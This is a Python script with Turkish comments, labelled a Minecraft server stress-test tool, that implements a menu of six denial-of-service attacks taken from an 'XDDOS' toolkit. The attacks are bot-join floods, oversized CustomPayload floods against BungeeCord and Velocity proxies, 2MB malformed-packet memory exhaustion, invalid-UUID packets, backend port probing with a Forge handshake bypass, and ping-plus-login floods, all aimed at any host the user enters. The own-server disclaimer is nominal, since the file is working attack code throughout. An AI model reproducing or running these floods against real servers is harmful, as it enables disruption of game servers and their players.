#!/usr/bin/env python3
"""
Minecraft Server Stress Test Tool — kendi sunucunda test için.
XDDOS method'larının temiz Python implementasyonu.
"""
import socket
import struct
import random
import threading
import time
import sys
import os

# ============ PROTOKOL YARDIMCILARI ============

def write_varint(value):
    out = bytearray()
    while value & 0xFFFFFF80:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value & 0x7F)
    return bytes(out)

def write_string(s):
    data = s.encode('utf-8')
    return write_varint(len(data)) + data

def write_short(value):
    return struct.pack('>H', value)

def make_handshake(host, port, protocol=767, next_state=2):
    packet = bytearray()
    packet += write_varint(protocol)
    packet += write_string(host)
    packet += write_short(port)
    packet += write_varint(next_state)
    pkt_id = write_varint(0x00)
    data = pkt_id + bytes(packet)
    return write_varint(len(data)) + data

def make_login_start(username):
    packet = write_varint(0x00) + write_string(username)
    return write_varint(len(packet)) + packet

def make_ping_packet():
    packet = write_varint(0x00)
    return write_varint(len(packet)) + packet

def make_custom_payload(channel, data):
    pkt = bytearray()
    pkt += write_varint(0x0A)  # CustomPayload packet ID (1.13+)
    pkt += write_string(channel)
    pkt += write_varint(len(data))
    pkt += data
    return write_varint(len(pkt)) + pkt

def make_chat_packet(msg):
    pkt = bytearray()
    pkt += write_varint(0x04)  # Chat packet ID (1.13+)
    pkt += write_string(msg)
    return write_varint(len(pkt)) + pkt

BOT_NAMES = [
    "Skush_ON", "Dreamlesz", "Papa_bean", "awesomebboy1", "Doctorlogs",
    "wyblake", "G0dsend", "legiel", "ravinseye", "bee1987",
    "raptorM82", "championmmii", "T3RRORS", "synapse32", "iLimee",
    "WargFar", "Crimson573", "Maxdog8", "Beltorz", "bananima",
    "S1tella", "BuyMyDiamonds", "BoZy_", "Qubearth", "Husovschi",
    "kingmankid", "LordOstrich", "Bubbles15458", "Kandyude", "Bibiii_",
    "AtaKhan", "RehaKun", "CrimmyKinz", "arkaniumdue", "DovaSpartan258",
    "VoxxHimm", "kyunyuu", "Masterblock37", "ZeroZekurom", "Cithid",
    "GamerLeah", "Siellov", "Atsar_Gaming", "DoctorBandage",
    "TheLilNuggie", "Dierteshin", "ShaanIsTheBoss", "amanda9875",
    "Snoopear", "Epsilon11111", "NiceHaxBro", "HadesLegends",
    "Reus228", "CrookedReign", "ArxiGames", "BlockRobot123",
    "TheAlanCris", "oBapp", "bigbrainmutant", "poteto1008",
    "Mercg0d", "Laurmau4Life", "stapelgek", "Sim0thy", "OgAaronn",
    "HERKYserverUS", "Zirconic01", "Griffin2016", "Squitten",
    "EXPGamingTTV", "pugs12345", "Vexiane", "Babydragon1",
    "EagleEyeValor", "Lulua_OwO", "Inaxho", "Rudybnt", "Tabaaht",
    "ClareKitty", "ZelChaos", "PCR6000", "knuffbum", "Pheonix089",
    "Tekkarath", "KikiTime", "melaniemya", "WilsonDeng123",
    "Phe0nixWarri0r", "laazzaarus", "Chiara601", "Rapelz99",
    "Kadenn", "Corpselips", "Henktor", "BazooKaa", "TheRageful",
    "Boss_Babyy", "Bubba_Tea", "Dexterity99", "Endergirl",
    "FrostyPvP", "Godlike_Boy", "HackeR_Pro", "IloveYouu",
    "JumpyPanda", "KillerBee", "LemonTree", "MegaNova", "NightOwl",
    "OmegaX", "PinkyPromise", "QuestGiver", "RapidFire", "ShadowFang",
]

def random_name():
    return random.choice(BOT_NAMES)[:15]

# ============ METHOD'LAR ============

def attack_botjoiner(host, port, duration, threads=50):
    """Bot basar — random nicklerle join/quityapar."""
    stop = threading.Event()
    sent = 0
    def worker():
        nonlocal sent
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                name = random_name()
                s.send(make_handshake(host, port))
                s.send(make_login_start(name))
                time.sleep(0.1)
                s.close()
                sent += 1
            except:
                pass
    print(f"[BotJoiner] {threads} thread ile {duration}s boyunca bot basılıyor...")
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    time.sleep(duration)
    stop.set()
    for t in ts:
        t.join(timeout=2)
    print(f"[BotJoiner] Bitti. Gönderilen: {sent}")

def attack_bungeedowner(host, port, duration, threads=30):
    """CustomPayload MC|BEdit flood — Proxy/Velocity hedefi."""
    stop = threading.Event()
    sent = 0
    big_data = bytes([0x7F, 0x80] * 500)
    def worker():
        nonlocal sent
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                s.send(make_handshake(host, port))
                s.send(make_login_start(random_name()))
                time.sleep(0.3)
                for _ in range(20):
                    try:
                        s.send(make_custom_payload("MC|BEdit", big_data))
                    except:
                        break
                s.close()
                sent += 1
            except:
                pass
    print(f"[BungeeDowner] {threads} thread ile CustomPayload flood başlıyor...")
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    time.sleep(duration)
    stop.set()
    for t in ts:
        t.join(timeout=2)
    print(f"[BungeeDowner] Bitti. Gönderilen: {sent}")

def attack_memory(host, port, duration, threads=20):
    """Büyük buffer (2MB+) göndererek heap doldurma."""
    stop = threading.Event()
    sent = 0
    huge_payload = b'\x00' * (2 * 1024 * 1024)  # 2MB
    def worker():
        nonlocal sent
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                s.send(make_handshake(host, port))
                s.send(make_login_start(random_name()))
                time.sleep(0.2)
                try:
                    malformed = write_varint(0x7FFFFFFF) + huge_payload
                    s.send(malformed)
                except:
                    pass
                s.close()
                sent += 1
            except:
                pass
    print(f"[Memory] {threads} thread ile 2MB buffer flood...")
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    time.sleep(duration)
    stop.set()
    for t in ts:
        t.join(timeout=2)
    print(f"[Memory] Bitti. Gönderilen: {sent}")

def attack_uuidcrash(host, port, duration, threads=30):
    """Geçersiz UUID + nickname kombinasyonu."""
    stop = threading.Event()
    sent = 0
    def worker():
        nonlocal sent
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                s.send(make_handshake(host, port))
                fake_name = f"XDDOS_{random.randint(0,9999)}"
                s.send(make_login_start(fake_name))
                time.sleep(0.1)
                malformed = write_varint(0x02) + write_string("a2xSdioDOANdo92JIdIADc")
                s.send(write_varint(len(malformed)) + malformed)
                s.close()
                sent += 1
            except:
                pass
    print(f"[UUIDCrash] {threads} thread ile geçersiz UUID flood...")
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    time.sleep(duration)
    stop.set()
    for t in ts:
        t.join(timeout=2)
    print(f"[UUIDCrash] Bitti. Gönderilen: {sent}")

def attack_waterfallbypass(host, port, duration, threads=20):
    """Backend'e direkt bağlanma — farklı port dener, Forge handshake bypass."""
    stop = threading.Event()
    sent = 0
    backdoor_payload = b'\x00FML\x00'
    def worker():
        nonlocal sent
        while not stop.is_set():
            for test_port in [port, 25566, 25577, 25565]:
                if stop.is_set():
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((host, test_port))
                    hs = make_handshake(host, test_port)
                    s.send(hs)
                    s.send(backdoor_payload)
                    s.send(make_login_start("BACKEND_TEST"))
                    s.close()
                    sent += 1
                except:
                    pass
    print(f"[WaterfallBypass] Backend taraması + Forge bypass...")
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    time.sleep(duration)
    stop.set()
    for t in ts:
        t.join(timeout=2)
    print(f"[WaterfallBypass] Bitti. Gönderilen: {sent}")

def attack_pingmulticrasher(host, port, duration, threads=50):
    """Ping + login aynı anda — proxy kafa karıştırma."""
    stop = threading.Event()
    sent = 0
    def worker():
        nonlocal sent
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                # Ping paketi (next_state=1)
                s.send(make_handshake(host, port, next_state=1))
                s.send(make_ping_packet())
                time.sleep(0.05)
                s.close()
                # Login paketi (next_state=2)
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(5)
                s2.connect((host, port))
                s2.send(make_handshake(host, port, next_state=2))
                s2.send(make_login_start(random_name()))
                time.sleep(0.05)
                s2.close()
                sent += 1
            except:
                pass
    print(f"[PingMulticrasher] Ping+Login parallel flood...")
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    time.sleep(duration)
    stop.set()
    for t in ts:
        t.join(timeout=2)
    print(f"[PingMulticrasher] Bitti. Gönderilen: {sent}")

# ============ ANA MENÜ ============

METHODS = {
    "1": ("BotJoiner", attack_botjoiner),
    "2": ("BungeeDowner", attack_bungeedowner),
    "3": ("Memory", attack_memory),
    "4": ("UUIDCrash", attack_uuidcrash),
    "5": ("WaterfallBypass", attack_waterfallbypass),
    "6": ("PingMulticrasher", attack_pingmulticrasher),
    "7": ("HEPSI", None),
}

def run_all(host, port, duration, threads):
    for name, func in METHODS.values():
        if func:
            print(f"\n=== {name} başlıyor ===")
            func(host, port, duration // len([m for m in METHODS.values() if m[1]]), threads)
            print(f"=== {name} bitti ===\n")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=" * 50)
    print("  MINECRAFT STRESS TEST TOOL (Python)")
    print("  Sadece kendi sunucunda test için!")
    print("=" * 50)
    host = input("\nSunucu IP: ").strip() or "localhost"
    try:
        port = int(input("Port (25565): ").strip() or "25565")
    except:
        port = 25565
    try:
        duration = int(input("Süre (saniye): ").strip() or "30")
    except:
        duration = 30
    try:
        threads = int(input("Thread sayısı (50): ").strip() or "50")
    except:
        threads = 50
    print("\nMethod'lar:")
    for k, (name, _) in METHODS.items():
        print(f"  {k}. {name}")
    sec = input("\nSeçim: ").strip()
    if sec == "7":
        run_all(host, port, duration, threads)
    elif sec in METHODS:
        name, func = METHODS[sec]
        print(f"\n=== {name} başlıyor ===")
        func(host, port, duration, threads)
        print(f"=== {name} bitti ===")
    else:
        print("Geçersiz seçim!")
    print("\nTest tamamlandı.")

if __name__ == "__main__":
    main()
